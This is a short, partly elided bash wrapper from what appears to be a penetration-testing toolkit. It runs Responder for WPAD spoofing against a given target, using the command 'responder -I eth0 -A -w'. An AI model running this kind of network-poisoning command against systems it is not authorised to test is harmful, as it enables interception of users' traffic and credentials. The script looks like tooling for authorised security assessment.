#!/usr/bin/env bash
# V-092.sh — WPAD spoofing
# Category: Host, Software and internal architecture
# Tool: responder
# Usage: bash V-092.sh <SESSION> <TARGET>
# Place at: ~/Desktop/trinetra/scripts/hexstrike/V-092.sh
set -euo pipefail

SESSION="${1:?ERROR: usage: bash V-092.sh <session> <target>}"
TARGET="${2:?ERROR: usage: bash V-092.sh <session> <target>}"
...
CMD="responder -I eth0 -A -w"

echo "[hex] V-092: WPAD spoofing → $TARGET"
...
python3 - \
    ...
    "V-092" "WPAD spoofing" "Host, Software and internal architecture" "responder" \
